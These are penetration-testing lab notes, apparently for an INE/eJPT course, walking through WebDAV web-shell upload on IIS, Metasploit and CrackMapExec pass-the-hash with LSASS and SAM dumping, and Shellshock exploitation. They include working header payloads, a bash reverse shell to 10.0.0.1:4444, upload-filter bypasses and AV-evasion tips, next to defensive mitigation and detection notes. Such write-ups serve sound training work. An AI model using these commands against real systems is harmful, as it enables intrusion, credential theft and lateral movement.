# WebDAV

## 1) Recon — find WebDAV on the webserver

**What happened:** you ran an initial nmap/service scan and found port 80 open and the server was IIS. Then you ran `http-enum` and it reported a `/webdav` path (but returned `401 Unauthorized`).

**Why this matters:**
WebDAV is an HTTP extension that—when enabled—lets clients remotely manage files (PUT, DELETE, MOVE, PROPFIND, etc.). If WebDAV accepts PUT or MOVE to a web-executable directory (and you can authenticate or it’s anonymous), you can upload a web shell.

Commands you could use:
```
nmap -sV demo.ine.local
nmap --script http-enum -sV -p 80 demo.ine.local
curl -I http://demo.ine.local/webdav      # check headers & status
curl -X OPTIONS http://demo.ine.local/webdav -i   # see allowed methods
```

What to look for: `Allow:` header listing `PUT`/`MOVE`/`DELETE`/`PROPFIND` or `DAV`: header indicating WebDAV. `401` means auth required.

## 2) Confirming WebDAV and authentication (davtest)

**What happened:** you ran `davtest` to quickly check which HTTP methods and file types the server accepts and whether authentication can be used.

**Why davtest:** it automates attempts to PUT many file types, tries different method combinations and reports which file types were accepted, and whether files can be executed.

Command (example):
```
davtest -url http://demo.ine.local/webdav
# with auth
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
```

Interpretation of results:

- If `davtest` shows it can upload `.asp`, `.html` and those are executable, it means the WebDAV endpoint writes files into a directory that the webserver serves and executes server-side scripts (ASP in IIS).

- Authentication accepted with `bob:password_123321` — you have valid credentials to upload.

## 3) Choose an appropriate web shell / backdoor

**What happened**: you chose an ASP web shell from a local repository (`/usr/share/webshells/asp/webshell.asp`) because the target runs IIS/ASP.

**Why this matters**: the type of server determines which shell language to use:

- IIS (classic ASP/ASPX) → use `.asp` or `.aspx` shells

- Apache/PHP → use `.php` shells

- Avoid uploading an executable with an extension that won’t run on the server (uploading `.php` to IIS won't help unless PHP is installed)

**Important**: Be careful which shell you upload; many are noisy. For labs, use a tiny benign command-execution page that accepts a `cmd` parameter (as in the lab).

## 4) Upload the web shell with a WebDAV client (cadaver)

**What happened**: you used `cadaver` to connect to the WebDAV folder and `put` the shell file.

**Why cadaver**: it is a command-line WebDAV client that behaves like an FTP client — you can list, upload, delete and move files.

Commands used:
```
cadaver http://demo.ine.local/webdav
# cadaver will prompt for username/password -> bob / password_123321
put /usr/share/webshells/asp/webshell.asp
ls
```

What to check after upload:

- ls should show your uploaded file.
- If server stores files in the served path, the file will be reachable at http://demo.ine.local/webdav/webshell.asp.

## 5) Trigger and test the shell in the browser or via curl

**What happened**: you browsed to `http://demo.ine.local/webdav/webshell.asp`, authenticated, and executed commands via either a form or a `cmd` query parameter:
```
http://demo.ine.local/webdav/webshell.asp?cmd=whoami
```

**Why this matters**: the shell executes the command on the server as the webserver process (IIS AppPool user). That proves you have remote command execution (RCE) at the privilege level of the webserver.

**What to expect:**

- Output of `whoami` showing the IIS user (e.g., `IIS APPPOOL\DefaultAppPool` or similar).
- Ability to run `dir C:\` to list root files, find `flag.txt`, and read it via `type C:\flag.txt`.

## 6) Retrieving the flag (post-exploitation read)

**What happened**: you ran:
```
http://demo.ine.local/webdav/webshell.asp?cmd=dir+C%3A%5C
http://demo.ine.local/webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt
```

and read the `flag.txt` contents.

**Explanation**: since the webserver process can read files accessible to it, it can read `C:\flag.txt` — which in the lab contained the flag.

Typical commands you might run via shell:

- `whoami` — find current user
- `ipconfig /all` — get network info
- `dir / type` — enumerate/read files
- `net user` — list local Windows users (if permissions allow)
- `systeminfo` — system details

## 7) Why this worked — technical summary

- **WebDAV enabled** on IIS and mapped to a path that the webserver serves.
- **Authentication** existed but you had valid credentials (`bob:password_123321`) which `davtest` and `cadaver` used to PUT files.
- **Executable file types allowed**: the server was configured to execute `.asp` files in that folder. (Sometimes IIS will treat uploaded files as static; in this lab it executed ASP.)
- **Web shell** executed with permissions of IIS App Pool; that was enough to read the flag file.

## 8) Variations & common tricks used in real attacks

- **PUT only, but no execute**: upload `.txt` then use `MOVE` to rename `.txt` → `.aspx` (IIS sometimes allows MOVE), to bypass upload filters.
- **Extension filtering bypass**: upload `shell.aspx;.txt` or `shell.aspx%20` or use an extension the server ignores then MOVE.
- **Directory traversal / misconfigured handlers**: sometimes uploaded files in unusual folders are executed because of handler mappings.
- **Anonymous WebDAV**: if `anonymous` or `guest` allowed, you may not need credentials.
- **Chaining to privilege escalation**: after RCE, pivot to local exploits or credential harvesting.

## 9) Defensive/Detection notes (how admins should prevent/monitor this)

**Mitigations:**

- Disable WebDAV if not required.
- Require strong authentication and minimal privileges for WebDAV users.
- Run web server processes with least privilege (AppPool accounts with constrained rights).
- Do not serve uploaded files from directories that execute server-side code. Store uploads outside the webroot or serve them via a sanitized pipeline.
- Restrict allowed HTTP methods (deny PUT, MOVE, DELETE) unless explicitly required.
- Restrict which file types can be uploaded; validate content server-side.

**Detection**:

- Monitor logs for PUT, MOVE, DELETE requests to web directories.
- Alert on successful PUT followed by HTTP GET to the same resource name.
- Monitor for suspicious query strings (e.g., ?cmd=) or POST bodies invoking commands.
- IDS/IPS: signatures for WebDAV file upload patterns and known web shell content.
- File integrity monitoring on webroot (notify on new/changed files).


## 10) Extra commands & quick references

Check allowed methods:
```
curl -i -X OPTIONS http://demo.ine.local/webdav
```

Manual PUT with curl (if auth required):
```
curl -u bob:password_123321 -T webshell.asp http://demo.ine.local/webdav/webshell.asp
```

MOVE (rename) example:
```
curl -X MOVE -u bob:password_123321 \
  -H "Destination: http://demo.ine.local/webdav/webshell.aspx" \
  http://demo.ine.local/webdav/webshell.txt
```

cadaver quick session:
```
cadaver http://demo.ine.local/webdav
# then in cadaver:
put webshell.asp
ls
quit
```

davtest example (to find allowed upload/exec types):
```
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
```
## 11) Post-exploitation safety & refinement

- If you get a shell, avoid noisy commands that could alert defenders.
- Use whoami and systeminfo first to understand context.
- If permitted by the lab, try to escalate privileges only with known lab-safe techniques.
- Always document steps and evidence (screenshots, command outputs) for reporting.

# Eternal Blue
https://tryhackme.com/room/blue

# Pass-the-Hash (PtH)
https://tryhackme.com/room/attacktivedirectory

https://tryhackme.com/room/postexploit

# BadBlue → Prepare LSASS → Migrate → Load Kiwi → SAM → Hashdump → PsExec → Set Target

This is the classic post-exploitation chain in Metasploit when exploiting a vulnerable Windows machine.

Let’s break it down properly.

 Step-by-Step Explanation
**1️. Exploit BadBlue**

> BadBlue is a vulnerable Windows web server. Metasploit has modules like: exploit/windows/http/badblue_passthru


After exploitation, you get:

✔ A Meterpreter session
✔ Running under the web server (e.g., IIS or BadBlue)
✘ Not SYSTEM yet → can’t dump hashes

**2️. Prepare LSASS Access → Migrate**

LSASS.exe holds credentials (NTLM hashes, Kerberos tickets).

But your current session is NOT SYSTEM, so:

Command:
```
migrate <PID of lsass>
```

> You NEVER migrate directly to LSASS (it crashes LSASS → BSOD).

 You migrate into a SYSTEM-owned process → e.g.

- winlogon.exe
- services.exe
- spoolsv.exe

>Then you access LSASS memory safely.

**3️. Load Kiwi (Meterpreter Mimikatz)**

Kiwi = Metasploit’s built-in Mimikatz.
```
load kiwi
```

Now you have:

- `lsa_dump_sam`
- `lsa_dump_secrets`
- `creds_all`
- `kerberos_ticket_list`

**4️. Dump SAM / NTDS (Hashes)**
Dump local hashes:
```
hashdump
```
Or using Kiwi:
```
lsa_dump_sam
```

You now have:
```
Administrator:500:aad3b435...:31d6cfe0...
bob:1001:...
nancy:1002:...
```
**5️. Pass-the-Hash (PsExec) to another target**

Metasploit’s PsExec module:
```
use exploit/windows/smb/psexec
set RHOSTS <target>
set SMBUser administrator
set SMBPass <NTLM hash>
set SMBPassIsHash true
run
```

This is the MOST RELIABLE lateral movement module because:

- Why PsExec is the most reliable?
- Uses SMB admin share (ADMIN$)
- Uses valid Windows authentication (NTLM)
- Doesn’t need code injection
- Doesn’t rely on AV-sensitive behavior
- Stable and widely supported across Windows versions

It is basically the same mechanism SysInternals PsExec uses.

**How to Perform the Same Attack Using CrackMapExec (CME)**

CrackMapExec is faster, cleaner, and used by real red-teamers.

**Part 1 — Enumerate the target**
SMB Fingerprinting
```
cme smb <IP>
```
**Part 2 — Pass-the-Hash using CME**

Assume you have:

- Username: `administrator`
- NTLM hash: `aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c`

Run PtH command:
```
cme smb <IP> -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c
```

If the hash is valid, CME returns:
```
[+] Login successful
```
**Part 3 — Get a remote shell with CME (PsExec equivalent)**
Using CME’s built-in PsExec
```
cme smb <IP> -u administrator -H <NTLM_HASH> --exec-method psexec
```

This gives you a SYSTEM-level cmd.exe shell.

Other exec methods:

- `--exec-method smbexec`
- `--exec-method wmiexec`
- `--exec-method atexec`

PsExec is usually the most reliable, but if AV blocks it:

→ Use `wmiexec` (fileless, stealthy)

→ Use `atexec` (scheduled task-based)

**Part 4 — Dump LSASS using CME**

CME can dump hashes using Mimikatz remotely:
```
cme smb <IP> -u administrator -H <HASH> --lsa
```

Or dump SAM:
```
cme smb <IP> -u administrator -H <HASH> --sam
```

Or dump secrets:
```
cme smb <IP> -u administrator -H <HASH> --ntds
```
**Part 5 — CME for Lateral Movement**

Let’s say you have a list of IPs:
```
cme smb 192.168.1.0/24 -u administrator -H <HASH> --exec-method wmiexec
```

This spreads and checks:

- authentication success
- admin rights
- remote shell capability

**Summary Table — Metasploit vs CME for PtH**
| Action           | Metasploit Command           | CrackMapExec Command           |
| ---------------- | ---------------------------- | ------------------------------ |
| Dump SAM         | `hashdump`                   | `cme smb <IP> --sam`           |
| Dump LSASS       | `load kiwi` → `lsa_dump_sam` | `cme smb <IP> --lsa`           |
| PtH login        | PsExec module                | `cme smb <IP> -u user -H hash` |
| Remote shell     | PsExec                       | `--exec-method psexec`         |
| Enumerate SMB    | auxiliary modules            | `cme smb <IP>`                 |
| Lateral movement | PsExec, WMI                  | `--exec-method wmiexec`        |

# Shellshock Lab

>Precondition / safety: Only run these steps against lab targets you own or are explicitly allowed to test (e.g., demo.ine.local). Don’t run them against production or third-party systems.

**Step 1 — Access Kali (lab VM)**

Action: Open the Kali lab VM and browser.

Why: Your Kali VM is the attacker machine with required tools (nmap, burp, curl).
Notes: Make sure network (NAT/host-only) is configured so Kali can reach the target.

**Step 2 — Recon: port scan with Nmap**

Command:
```
nmap demo.ine.local
```

What it does: Discovers open TCP ports and basic service/version info.

Expected result: Port `80/tcp (HTTP)` is reported open.

Why: Identifies that a web server is running and where to look for CGI scripts.

**Step 3 — Visit the site in a browser**

Action: Open `http://demo.ine.local` in Firefox.

Why: Manual inspection sometimes reveals CGI pages, admin paths, or hints in the web UI. This also confirms the site serves content and that interactive testing is possible.

**Step 4 — Inspect page source for CGI (or look for `/cgi-bin/`)**

Action: Right-click → View Page Source (or look for URLs like `/cgi-bin/gettime.cgi`).

Why: Shellshock is commonly exploitable via CGI because HTTP headers become environment variables for CGI processes — so a site using CGI is a high-value target.

What to look for: `action="/cgi-bin/..."` or any file ending `.cgi`.

**Step 5 — Use Nmap NSE to check Shellshock vulnerability**

Command:
```
nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local
```

What it does: Uses the NSE `http-shellshock` script to test the specified CGI endpoint for the Shellshock flaw. The script injects test payloads into HTTP headers and checks responses for command output or anomalies.

Expected result: Script reports the host as `VULNERABLE` if it sees evidence (e.g., command output or other behavioral changes).

Why: Quick automated confirmation before manual exploitation.

**Step 6 — Find/choose an exploit (reference)**

Action: You located the public exploit repo (e.g., opsxcq/exploit-CVE-2014-6271).

Why: The repo contains PoCs and examples showing how to craft headers and what behavior to expect. Use these only to understand the payload mechanics; always run in a lab.

**Step 7 — Plan the injection vector (User-Agent header)**

Why the User-Agent? CGI turns HTTP headers into environment variables. `User-Agent`, `Referer`, `Cookie`, etc., often get passed to the server as `HTTP_USER_AGENT`, `HTTP_REFERER`, etc. Modifying these is how you supply the malicious environment variable.

Common target headers:

- `User-Agent`
- `Referer`
- `Cookie`
- `X-Forwarded-For` (sometimes used)

**Step 8 — Intercept the request with Burp (set up proxy)**

Actions:

Configure Firefox to proxy through Burp (FoxyProxy or manual proxy setting to `127.0.0.1:8080`).

Start Burp → Proxy → Intercept on.

Reload the target page to capture the HTTP request.

Why: Burp allows precise editing of headers and easy send-to-repeater for iterative exploit attempts.

**Step 9 — Send to Repeater and inject the payload**

Action: Right-click the intercepted request → Send to Repeater → go to Repeater tab.

Why: Repeater lets you modify the request and reissue it repeatedly while viewing the raw response.

Payload example (lab-safe commands you used):
```
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```

What happens: The initial `() { :; };` constructs a function definition in the environment. Vulnerable Bash then executes subsequent commands (`echo; /bin/bash -c` `'cat /etc/passwd'`) when it handles the CGI environment, causing the server to run `cat /etc/passwd` and return the output in the HTTP response (or in server logs).

Important: Use simple benign commands first (`id`, `whoami`, `cat /etc/passwd`) to confirm RCE before anything invasive.

**Step 10 — Send and observe response**

Action: Click Send in Repeater.

Expected output: The HTTP response includes the result of your command — e.g., the `/etc/passwd` content or the output of `id`/`ps -ef`. That proves RCE.

Why: Demonstrates that the server executes arbitrary code from environment variables (Shellshock vulnerability).

**Step 11 — Try additional commands (confirm context / privileges)**

Commands used in lab:

- `() { :; }; echo; echo; /bin/bash -c 'id'` → shows user context (likely `www-data`, `nobody`, or similar).

- `() { :; }; echo; echo; /bin/bash -c 'ps -ef'` → lists running processes to help orient post-exploit work.

Why: Knowing the user context and running processes helps you plan next steps (file access, pivot, escalate).

**Step 12 — Document results & capture evidence**

What to record:

- Nmap output showing port 80 open.
- Nmap NSE output marking the host vulnerable.
- Repeater request & response screenshots (with command and output visible).
- Exact header you injected and the full HTTP response.

Why: Good lab/report hygiene — include commands, outputs, timestamps, and screenshots for reproducibility and grading.

### Shellshock Lab Checklist
- [ ] nmap demo.ine.local -> confirm port 80 open
- [ ] Inspect page source -> locate /cgi-bin/gettime.cgi
- [ ] nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local
- [ ] Intercept request with Burp, send to Repeater
- [ ] Modify header: User-Agent: () { :; }; echo; /bin/bash -c 'id'
- [ ] Send and capture response (include screenshots)
- [ ] Document commands, outputs, and mitigation recommendations

## Shellshock Reverse Shell Payload Explained
```
() { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```
This is a classic reverse shell delivered via a malicious HTTP header (usually `User-Agent`, `Referer`, etc.) to exploit Shellshock (CVE-2014-6271).

Let’s break it down.

**Shellshock Core Vulnerability Portion**
```
() { :; };
```
This is interpreted by Bash as:

- A function definition named `()`
- Containing an empty command (`:` = no-op)
- Ending with `;`

**The vulnerability:**

Anything after the function definition is executed automatically when Bash parses environment variables.

This means the next part becomes your **payload**.

**The Exploit Payload Portion**
```
echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```
The two `echo` statements are often used to:

- Force reliable output
- Break up the CGI response cleanly

But the real attack is here:
```
/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```
This tells the server to:

1. Launch a new Bash shell in interactive mode:
```
bash -i
```
2. Redirect STDOUT and STDERR to your attacker's machine:
```
>& /dev/tcp/10.0.0.1/4444
```
3. Redirect STDIN from the same TCP connection:
```
0>&1
```
# Last Task :- CTF

## Gobuster 
| Status Code | Meaning            | Should You Investigate?                                 |
| ----------- | ------------------ | ------------------------------------------------------- |
| **200**     | OK (Success)       | ⭐ YES — This is the best result                         |
| **204**     | No content         | Sometimes                                               |
| **301**     | Redirect           | ⭐ YES — Directory exists                                |
| **302**     | Temporary redirect | Depends — still useful                                  |
| **307/308** | Redirect           | Sometimes important                                     |
| **403**     | Forbidden          | ⭐ Directory exists but access blocked (still important) |
| **401**     | Unauthorized       | ⭐ Needs login (very important)                          |
| **404**     | Not Found          | Ignore                                                  |
| **500**     | Server Error       | Check manually                                          |

| Status  | Meaning                      | Importance            |
| ------- | ---------------------------- | --------------------- |
| **200** | File found and readable      | 🔥 Highest importance |
| **301** | Directory exists (redirect)  | 🔥 High               |
| **403** | Directory exists but blocked | 🔥 High               |
| **404** | Not found                    | ❌ Ignore              |
| **500** | Server broke                 | ⚠️ Maybe interesting  |

https://prinugupta.medium.com/assessment-methodologies-vulnerability-assessment-ctf-1-ejpt-ine-7e61828577a5
